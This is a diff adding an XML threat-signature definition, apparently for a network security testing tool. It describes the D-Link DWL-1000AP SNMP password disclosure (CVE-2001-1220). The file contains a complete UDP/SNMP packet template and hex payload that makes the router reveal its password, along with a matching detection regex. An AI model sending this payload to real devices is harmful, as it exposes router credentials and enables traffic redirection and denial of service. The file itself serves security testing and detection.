@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="D-Link Wireless Router Password Disclosure"/>
+    <EngDesc display="true" value="This threat sends an SNMP request that causes certain versions of D-Link's wireless routers to disclose the password for the device.  This can be used by an attacker to redirect traffic, or deny service to other users."/>
+    <Intent display="true">
+      <item value="Scoping"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="SNMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Wireless_AP"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="D-Link"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="D-Link_DWL-1000AP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="D-Link_DWL-1000AP_3.2.28"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/3735"/>
+    <CVEID display="true" value="CVE-2001-1220"/>
+    <bugtraqID display="true" value="3735"/>
+    <OSVDB display="true" value="9403"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000001059814149100c000a80001003c1c3719d1"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="true"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725881328750000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X2D\X02\X01\X00\X04\X06\X70\X75\X62\X6C\X69\X63\XA0\X20\X02\X04\X58\X2E\X75\X86\X02\X01\X00\X02\X01\X00\X30\X12\X30\X10\X06\X0C\X2B\X06\X01\X04\X01\X87\X29\X02\X01\X02\X02\X00\X05\X00"/>
+    <Created value="1139461964" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SNMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0, FFFF)" FragmentOffset="0" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026, 65535)" destPort="$SNMPdestPort" checksum="" length="" Payload="302D02010004067075626C6963A0200204582E758602010002010030123010060C2B06010401872902010202000500"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
